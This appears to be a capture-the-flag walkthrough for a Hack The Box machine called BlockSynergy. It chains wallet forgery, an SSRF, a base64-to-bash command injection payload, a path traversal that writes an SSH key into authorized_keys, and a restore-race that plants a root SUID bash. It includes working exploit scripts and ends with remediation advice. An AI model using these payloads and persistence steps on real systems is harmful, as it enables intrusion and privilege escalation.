# BlockSynergy - Complete Walkthrough (User and Root)

**Platform:** Hack The Box  
**Difficulty:** Insane  
**Operating system:** Linux  
**Scope:** Authorized HTB laboratory instance only  
**Document version:** Share-safe edition (flags, credentials, keys, IP addresses, local paths, and personal identifiers removed)

---

## Placeholder legend

Replace these values only in your private working copy:

| Placeholder | Meaning |
|---|---|
| `<TARGET_IP>` | Current BlockSynergy machine IP |
| `<VPN_TUN_IP>` | Your HTB VPN tunnel IP |
| `<SSH_KEY_FILE>` | Private key generated for the Hank foothold |
| `<YOUR_SSH_PUBLIC_KEY>` | Matching public key, with a unique comment |
| `<FTP_PASSWORD>` | FTP credential observed in the root cron process |
| `<USER_FLAG>` | Contents of `/home/walter/user.txt` |
| `<ROOT_FLAG>` | Contents of `/root/root.txt` |
| `<NONCE>` | Unique value used to avoid collisions with other players or attempts |

No real flag, credential, key, HTB account name, local username, or workstation path appears in this document.

---

## Attack chain

```text
Unauthenticated web access
  -> public blockchain exposes historical balances
  -> wallet loader accepts an unrelated private/public key pair
  -> forged VIP wallet
  -> Node Management SSRF via 0.0.0.0
  -> localhost-only admin panel
  -> URL parser differential in ping_node
  -> command injection as walter
  -> user.txt
  -> internal Flask application on 127.0.0.1:5000
  -> ContractEngine debug log hook path traversal
  -> SSH public key appended as hank
  -> SSH shell as hank
  -> root cron observed with pspy64
  -> FTP credential and restore workflow recovered
  -> checksum-aware TOCTOU in /var/restore_work
  -> root-owned SUID bash planted as /opt/blocksynergy/.diag
  -> bash -p preserves euid=0
  -> root.txt
```

---

## 1. Initial reconnaissance

Run a complete TCP scan, then a focused service scan:

```bash
nmap -Pn -n -sT -p- --min-rate 1000 <TARGET_IP>
nmap -Pn -n -sCV -p22,8080 <TARGET_IP>
```

Relevant services:

```text
22/tcp   open  ssh
8080/tcp open  http  Werkzeug / Python
```

The application is available at:

```text
http://<TARGET_IP>:8080/
```

The application implements a custom blockchain, wallets, a VIP area, node management, and an administrator panel restricted to localhost.

---

## 2. Forge a VIP wallet without mining

### 2.1 Vulnerability

The public `/blockchain` endpoint exposes every historical transaction. A client can therefore reconstruct the balance associated with every public key.

The wallet import function accepts `private_key` and `public_key` independently. It does not verify that the public key is mathematically derived from the supplied private key.

The VIP check trusts the balance associated with the imported `public_key`. We can therefore:

1. Ask the application to generate a valid private key.
2. Calculate the richest historical public key from the public chain.
3. Create a hybrid wallet containing our valid private key and the rich public key.
4. Import the hybrid wallet and inherit its balance.

Mining is not required.

### 2.2 VIP wallet script

```python
#!/usr/bin/env python3
import html
import json
import re
from collections import defaultdict

import requests

BASE = "http://<TARGET_IP>:8080"
session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0"

# Create a legitimate local private key.
response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "create", "filename": "fresh"},
    timeout=20,
)
response.raise_for_status()
fresh_wallet = response.json()

# Reconstruct balances from the public chain.
chain = session.get(f"{BASE}/blockchain", timeout=20).json()
balances = defaultdict(int)

for block in chain:
    for transaction in block.get("data", []):
        if not isinstance(transaction, dict) or "amount" not in transaction:
            continue

        amount = int(transaction["amount"])
        sender = transaction.get("sender")
        receiver = transaction.get("receiver")

        if receiver:
            balances[receiver] += amount
        if sender and sender != "Blockchain_Reward":
            balances[sender] -= amount

vip_public_key, vip_balance = max(balances.items(), key=lambda item: item[1])
assert vip_balance >= 10, "No VIP-capable historical wallet found"

forged_wallet = {
    "private_key": fresh_wallet["private_key"],
    "public_key": vip_public_key,
}

response = session.post(
    f"{BASE}/dashboard/wallet",
    data={"action": "load"},
    files={
        "file": (
            "forged_wallet.json",
            json.dumps(forged_wallet),
            "application/json",
        )
    },
    timeout=20,
)
response.raise_for_status()
assert "Wallet loaded successfully" in response.text

print(f"VIP wallet loaded (balance={vip_balance})")
```

Keep the same `requests.Session()` object for the following steps because the wallet state is session-bound.

### 2.3 Important warning

Do not submit malformed transactions such as an empty JSON object to `/broadcast_transaction`. On a shared or long-lived instance, malformed pending data can poison the transaction pool and make unrelated routes return HTTP 500 until the machine is reset.

---

## 3. SSRF to the localhost-only administrator panel

### 3.1 Node Management as an SSRF primitive

VIP users can register an arbitrary node URL and ask the server to test it:

```text
POST /dashboard/vip/nodes
GET  /dashboard/vip/nodes/test_node/<NODE_ID>
```

The application blocks common loopback spellings, including `127.0.0.1` and `localhost`, but accepts `0.0.0.0`.

From the target itself, this URL reaches the local service on port 8080:

```text
http://0.0.0.0:8080/admin
```

A direct request to `/admin` returns `403 Permission Denied`, while the SSRF response contains the administrator dashboard. This is the required baseline/control pair.

### 3.2 Register and resolve the exact node ID

Do not assume that a node's list position is stable. Resolve the ID from the exact URL row:

```python
def register_node(url):
    response = session.post(
        f"{BASE}/dashboard/vip/nodes",
        data={"action": "register", "node": url},
        timeout=20,
    )
    response.raise_for_status()


def find_node_id(url):
    page = session.get(f"{BASE}/dashboard/vip/nodes", timeout=20).text
    pairs = [
        (html.unescape(value), node_id)
        for value, node_id in re.findall(
            r'title="([^"]+)".*?testNode\(\'([0-9]+)\'\)',
            page,
            re.S,
        )
    ]
    return next(
        node_id
        for value, node_id in reversed(pairs)
        if value == url
    )


def test_node(url):
    node_id = find_node_id(url)
    response = session.get(
        f"{BASE}/dashboard/vip/nodes/test_node/{node_id}",
        timeout=60,
    )
    response.raise_for_status()
    return response.text


admin_url = "http://0.0.0.0:8080/admin"
register_node(admin_url)
assert "Admin Dashboard" in test_node(admin_url)
print("Local administrator panel reached through SSRF")
```

---

## 4. Command injection through the URL parser differential

### 4.1 Vulnerability

The administrator action `ping_node` extracts an address from a supplied URL and passes it to a shell command without safe argument separation.

The registration filter and the administrator action parse the same URL differently. A crafted URL with userinfo presents `<VPN_TUN_IP>` as the hostname to the validator while shell metacharacters remain in the value later consumed by `ping_node`.

Payload structure:

```text
http://foo&echo$IFS''<BASE64_COMMAND>|base64$IFS''-d|bash&@<VPN_TUN_IP>:18083/
```

`$IFS` substitutes for spaces. Base64 avoids quoting and metacharacter problems inside the command body.

### 4.2 Reusable command execution helper

Append this code to the VIP script so it reuses the same authenticated session:

```python
import base64
from urllib.parse import urlencode

VPN_IP = "<VPN_TUN_IP>"


def execute_as_walter(command):
    encoded = base64.b64encode(command.encode()).decode()

    command_node = (
        "http://foo&echo$IFS''"
        + encoded
        + "|base64$IFS''-d|bash&@"
        + VPN_IP
        + ":18083/"
    )

    # The administrator code expects the target to exist in the node list.
    register_node(command_node)

    internal_action = (
        "http://0.0.0.0:8080/admin/nodes/manage?"
        + urlencode({"action": "ping_node", "target": command_node})
    )
    register_node(internal_action)

    body = test_node(internal_action)
    outputs = [
        html.unescape(value).strip()
        for value in re.findall(r"<pre[^>]*>(.*?)</pre>", body, re.S)
        if html.unescape(value).strip()
    ]
    return "\n".join(outputs)


print(execute_as_walter("hostname; id"))
```

Expected privilege:

```text
uid=1000(walter) gid=1000(walter) groups=1000(walter)
```

### 4.3 User flag

```python
print(execute_as_walter("id; cat /home/walter/user.txt"))
```

Expected result:

```text
uid=1000(walter) ...
<USER_FLAG>
```

Record the flag only in your private notes. Do not put it in a shared writeup.

---

## 5. Discover the internal development application

Use the Walter command primitive to enumerate listening services:

```bash
ss -lntp 2>/dev/null
curl -s http://127.0.0.1:5000/dashboard | head
```

Port 5000 hosts a second Flask application under `/opt/staging/smart_contracts`. Useful source files include:

```text
/opt/staging/smart_contracts/dev_app.py
/opt/staging/smart_contracts/dev_blockchain.py
/opt/staging/smart_contracts/contract.py
```

Read them through the Walter command primitive:

```bash
sed -n '1,240p' /opt/staging/smart_contracts/contract.py
sed -n '1,220p' /opt/staging/smart_contracts/dev_app.py
```

The development service runs as `hank`.

---

## 6. ContractEngine debug hook path traversal to Hank

### 6.1 Vulnerability

`ContractEngine.run_hook()` supports a debug-only `log` hook. When `debug` is the string `"True"`, it builds a path like this:

```python
logfile = f"/opt/staging/smart_contracts/logs/{file}"
with open(logfile, "a") as handle:
    handle.write(content)
```

The user-controlled `log_file` value is not normalized or restricted. A traversal can therefore append attacker-controlled data to a file writable by Hank.

The traversal base is:

```text
/opt/staging/smart_contracts/logs/
```

Four parent traversals reach the filesystem root:

```text
../../../../home/hank/.ssh/authorized_keys
```

### 6.2 Generate a dedicated key pair

On your attack host:

```bash
ssh-keygen -t ed25519 -f <SSH_KEY_FILE> -N '' -C blocksynergy-writeup
```

Set `<YOUR_SSH_PUBLIC_KEY>` to the single line from `<SSH_KEY_FILE>.pub`.

### 6.3 Malicious contract

Create `/tmp/hank_contract.json` through the Walter command primitive:

```json
{
  "name": "ssh-bootstrap",
  "id": 1,
  "owner": "Developer",
  "debug": "True",
  "logic": {
    "mint": "allow"
  },
  "storage": {
    "balances": {},
    "total_supply": 0
  },
  "hooks": {
    "on_mint": "log"
  },
  "__meta__": {
    "log_file": "../../../../home/hank/.ssh/authorized_keys",
    "log_content": {
      "on_mint": "\n<YOUR_SSH_PUBLIC_KEY>\n"
    }
  }
}
```

The intended machine image already contains `/home/hank/.ssh`. Verify that the directory exists before attempting the append.

### 6.4 Upload and trigger the hook

Run these commands through the Walter shell primitive. The cookie handling is important: the upload response creates the Flask session, so the upload request must use both `-b` and `-c` before the mint request.

```bash
curl -s -c /tmp/hank_contract.jar \
  http://127.0.0.1:5000/dashboard >/dev/null

curl -s -b /tmp/hank_contract.jar -c /tmp/hank_contract.jar \
  -F action=upload_contract \
  -F contract_file=@/tmp/hank_contract.json \
  http://127.0.0.1:5000/dashboard \
  -o /tmp/hank_upload.html

grep -q 'Contract loaded' /tmp/hank_upload.html

curl -s -b /tmp/hank_contract.jar -c /tmp/hank_contract.jar \
  -d action=contract_mint \
  -d contract_mint_amount=1 \
  http://127.0.0.1:5000/dashboard \
  -o /tmp/hank_mint.html
```

### 6.5 SSH as Hank

```bash
ssh -i <SSH_KEY_FILE> \
  -o IdentitiesOnly=yes \
  hank@<TARGET_IP>
```

Expected identity:

```text
uid=1001(hank) gid=1003(hank) groups=1003(hank),1001(developers)
```

At this point the user foothold is complete.

---

## 7. Privilege escalation reconnaissance as Hank

### 7.1 Cron and permissions

```bash
cat /etc/crontab
stat -c '%U:%G %a %A %n' /opt/backup /opt/blocksynergy /var/restore_work
ps -eo pid,ppid,user,args --no-headers | grep restore_daemon
```

Relevant results:

```text
*/5 * * * * root /opt/backup/backup.sh
/opt/backup        root:sysadmins 0770
/opt/blocksynergy  hank:developers 0775
/var/restore_work  root:developers 0775
root ... /bin/bash /opt/backup/restore_daemon.sh
```

Hank cannot read `/opt/backup/backup.sh` directly, but can write within `/opt/blocksynergy` and `/var/restore_work`.

### 7.2 Observe the root cron job with pspy64

Transfer any trusted copy of `pspy64` to the lab and run it as Hank:

```bash
chmod 700 /tmp/pspy64
/tmp/pspy64 -pf -i 1000
```

At the next five-minute cron boundary, pspy exposes the backup command:

```text
UID=0 | /bin/tar czf /tmp/_opt_blocksynergy.tar.gz /opt/blocksynergy
UID=0 | /usr/bin/curl -T /tmp/_opt_blocksynergy.tar.gz \
  ftp://ftpuser:<FTP_PASSWORD>@127.0.0.1:15432/upload/_opt_blocksynergy.tar.gz
```

Store the credential privately as `<FTP_PASSWORD>`. Never publish the real value.

### 7.3 Understand the restore workflow

Creating this sentinel requests a restore:

```bash
touch /opt/blocksynergy/restore
```

The daemon:

1. Checks the SHA-256 of the FTP archive against the root-owned manifest.
2. Downloads the validated archive into `/var/restore_work/_opt_blocksynergy.tar.gz`.
3. Extracts the downloaded copy as root with:

```text
/bin/tar xvf /var/restore_work/_opt_blocksynergy.tar.gz -C /
```

`/var/log/restore.log` confirms the behavior:

```text
[*] restore file found!
[*] Checksum verified. Restoring /opt/blocksynergy...
[*] /opt/blocksynergy restored
```

If the FTP archive is replaced before validation, the log contains:

```text
[*] Checksum mismatch! Restore aborted.
```

This is why directly overwriting the FTP copy is not the exploit.

---

## 8. Root cause: post-checksum TOCTOU in `/var/restore_work`

The checksum covers the FTP object. The daemon then downloads a separate local copy into a group-writable directory and later extracts that local pathname.

This creates a time-of-check/time-of-use gap:

```text
FTP archive passes root-owned checksum
  -> clean archive downloaded into /var/restore_work
  -> attacker atomically replaces the downloaded directory entry
  -> root tar opens the attacker archive
```

The swap must occur only after the clean download is complete. On the tested image, the clean archive was larger than 10 MB. Use the completed file size as the signal.

Use exactly one atomic replacement:

```bash
cp /home/hank/suid.tar.gz /var/restore_work/.swp
mv -fT /var/restore_work/.swp \
  /var/restore_work/_opt_blocksynergy.tar.gz
```

Do not continuously copy over the destination. A busy copy loop can corrupt the gzip stream while root is reading it.

---

## 9. Optional harmless validation of the race

Before planting a SUID binary, the same race can be validated with a harmless nonce-bound text file:

```bash
NONCE=<NONCE>
STAGE=/home/hank/.probe_$NONCE
mkdir -p "$STAGE/opt/blocksynergy"
printf 'RACE_PROBE:%s\n' "$NONCE" \
  > "$STAGE/opt/blocksynergy/.race_probe_$NONCE"

tar --numeric-owner --owner=0 --group=0 --mode=0644 \
  -czf /home/hank/probe.tar.gz \
  -C "$STAGE" "opt/blocksynergy/.race_probe_$NONCE"
```

Arm the watcher without creating the sentinel and confirm that the marker remains absent. Then create the sentinel, perform the single atomic swap, and require all of these postconditions:

```text
owner=root
group=root
mode=0644
content=RACE_PROBE:<NONCE>
```

A printed `SWAPPED` line alone is not proof.

---

## 10. Build the malicious SUID archive

Create a tar archive containing `/bin/bash`, transformed to `/opt/blocksynergy/.diag` and carrying root ownership plus mode 4755:

```bash
tar --numeric-owner \
  --owner=0 \
  --group=0 \
  --mode=4755 \
  --transform='s|^bash$|opt/blocksynergy/.diag|' \
  -czf /home/hank/suid.tar.gz \
  -C /bin bash
```

Verify the archive before triggering anything:

```bash
tar -tvzf /home/hank/suid.tar.gz
```

Expected metadata:

```text
-rwsr-xr-x 0/0 ... opt/blocksynergy/.diag
```

---

## 11. Win the restore race

Create `/home/hank/win.sh`:

```bash
#!/bin/bash
set -u

F=/var/restore_work/_opt_blocksynergy.tar.gz
TMP=/var/restore_work/.swp_<NONCE>
PAYLOAD=/home/hank/suid.tar.gz
DIAG=/opt/blocksynergy/.diag
LOG=/home/hank/win.log
END=$((SECONDS + 80))
SWAPPED=0

echo "ARMED" > "$LOG"

while [ "$SECONDS" -lt "$END" ]; do
  if [ -f "$F" ] && [ "$SWAPPED" -eq 0 ]; then
    SIZE=$(stat -c %s "$F" 2>/dev/null || echo 0)

    if [ "$SIZE" -gt 10000000 ]; then
      cp "$PAYLOAD" "$TMP" 2>/dev/null

      if mv -fT "$TMP" "$F" 2>/dev/null; then
        echo "SWAPPED size=$SIZE" >> "$LOG"
        SWAPPED=1
      fi
    fi
  fi

  # Do not exit on first sight of the file. Tar can expose a partial file
  # with temporary mode 0700 while extraction is still in progress.
  if [ -f "$DIAG" ]; then
    OWNER=$(stat -c %U:%G "$DIAG")
    MODE=$(stat -c %a "$DIAG")

    if [ "$OWNER" = "root:root" ] && [ "$MODE" = "4755" ]; then
      stat -c 'READY owner=%U:%G mode=%a size=%s' "$DIAG" >> "$LOG"
      echo "DIAG_READY" >> "$LOG"
      exit 0
    fi
  fi

  sleep 0.02
done

echo "TIMEOUT swapped=$SWAPPED" >> "$LOG"
exit 1
```

Run it and trigger the restore:

```bash
chmod 700 /home/hank/win.sh
nohup /home/hank/win.sh >/dev/null 2>&1 </dev/null &
sleep 1
touch /opt/blocksynergy/restore
```

Monitor the result:

```bash
tail -f /home/hank/win.log
```

Expected evidence:

```text
SWAPPED size=<CLEAN_ARCHIVE_SIZE>
READY owner=root:root mode=4755 size=<BASH_SIZE>
DIAG_READY
```

If the watcher misses the gap, remove stale temporary files and retrigger. The restore workflow downloads a fresh clean copy each time. Never use a continuous overwrite loop.

---

## 12. Root shell and root flag

Verify the extracted binary independently:

```bash
stat -c 'owner=%U:%G mode=%a size=%s' /opt/blocksynergy/.diag
```

Required state:

```text
owner=root:root mode=4755
```

Use bash preserve mode (`-p`) so the effective UID is not dropped:

```bash
/opt/blocksynergy/.diag -p
```

Or run a non-interactive proof:

```bash
/opt/blocksynergy/.diag -p -c 'id; cat /root/root.txt'
```

Expected identity:

```text
uid=1001(hank) gid=1003(hank) euid=0(root) groups=1003(hank),1001(developers)
<ROOT_FLAG>
```

The decisive property is `euid=0(root)`. File existence, archive metadata, or a `SWAPPED` marker alone is not root proof.

---

## 13. Cleanup

After recording the flags privately, remove only the artifacts created for the exploit:

```bash
rm -f /opt/blocksynergy/.diag
rm -f /opt/blocksynergy/restore
rm -f /var/restore_work/.swp_<NONCE>
rm -f /home/hank/suid.tar.gz
rm -f /home/hank/win.sh
rm -f /home/hank/win.log
```

Remove only your own SSH key line, identified by its unique comment:

```bash
sed -i '/blocksynergy-writeup$/d' /home/hank/.ssh/authorized_keys
```

Verify cleanup:

```bash
for path in \
  /opt/blocksynergy/.diag \
  /opt/blocksynergy/restore \
  /var/restore_work/.swp_<NONCE> \
  /home/hank/suid.tar.gz \
  /home/hank/win.sh; do
  [ ! -e "$path" ] || echo "leftover: $path"
done
```

---

## 14. Common failure modes and dead ends

### Directly replace the FTP archive

**Result:** `Checksum mismatch! Restore aborted.`

**Reason:** the root-owned manifest protects the FTP object.

**Fix:** replace the downloaded copy in `/var/restore_work` after validation.

### Replace the local archive too early

**Result:** checksum or download validation fails, or the daemon overwrites the malicious file with the clean download.

**Fix:** wait until the local file exists and exceeds the known completed-download threshold.

### Continuous copy loop

**Result:** gzip/tar errors or a partially extracted binary.

**Reason:** root opens the file while it is still being overwritten.

**Fix:** copy to a separate temporary path and perform one `mv -fT`.

### Execute `.diag` immediately when it first appears

**Result:** mode may temporarily be `0700`, and the file size can be incomplete.

**Fix:** wait for `root:root`, mode `4755`, and the full expected size.

### Trust a printed marker

**Result:** false success, especially if the script continued after an error.

**Fix:** verify ownership, mode, exact nonce-bound content, `euid=0`, and fresh flag reads.

### Use unstable node indexes

**Result:** the request tests another node or another player's stale entry.

**Fix:** resolve the ID from the exact URL row in the current session.

### Reuse generic temporary filenames

**Result:** concurrent attempts overwrite `/tmp/c.json`, cookie jars, scripts, or outputs.

**Fix:** include a unique nonce in every temporary pathname.

### Pursue Mike/sysadmins for root

Mike is the only `sysadmins` member and can access `/opt/backup`, but this is not required for the intended root path. The checksum-aware restore race goes directly from Hank to root.

### Reset the machine and reuse old state

A reset changes the target IP, process state, sessions, injected keys, and both flags. Revalidate the route, target, footholds, and flags on every new instance.

---

## 15. Final proof checklist

Before calling the machine complete, require all of the following:

- TODO - Current target IP and HTB VPN route verified.
- TODO - VIP wallet import demonstrated on the current instance.
- TODO - SSRF reaches the localhost administrator page while direct access returns 403.
- TODO - Command output proves `uid=1000(walter)`.
- TODO - `/home/walter/user.txt` read freshly as `<USER_FLAG>`.
- TODO - SSH output proves `uid=1001(hank)`.
- TODO - Restore negative control produces no marker without the sentinel.
- TODO - Benign race produces a nonce-bound `root:root` marker.
- TODO - SUID archive metadata is `0/0 4755` before use.
- TODO - Extracted `.diag` is independently verified as `root:root 4755` at full size.
- TODO - `id` shows `euid=0(root)`.
- TODO - `/root/root.txt` read freshly as `<ROOT_FLAG>`.
- TODO - All persistence and temporary exploit artifacts removed.

---

## 16. Remediation summary

Although this is a CTF machine, the defensive fixes map cleanly to real systems:

1. Derive and verify public keys from imported private keys; never trust an independently supplied identity field.
2. Apply SSRF validation after DNS resolution and on every redirect; reject loopback, unspecified, link-local, private, and metadata ranges.
3. Never construct shell commands from URL components; use argument arrays and strict allowlists.
4. Remove debug hooks from production and resolve file paths beneath an approved directory with canonical-path checks.
5. Do not expose credentials in process command lines.
6. Keep restore staging directories root-only.
7. Verify and open the same immutable file descriptor; do not checksum one object and later extract a replaceable pathname.
8. Extract archives with restrictive ownership/mode policies, reject absolute/traversal paths, and explicitly strip SUID/SGID bits.

---

## Conclusion

BlockSynergy chains several individually understandable flaws into an Insane-level compromise:

```text
identity mismatch -> VIP -> SSRF -> command injection -> Walter
-> debug file write -> Hank -> checksum-aware TOCTOU -> euid 0
```

The most important root insight is that the checksum is not broken. The daemon correctly validates the FTP archive, but then creates a new, replaceable object inside a group-writable directory and extracts it later by pathname. Replacing that second object after verification converts an integrity check into a TOCTOU vulnerability.
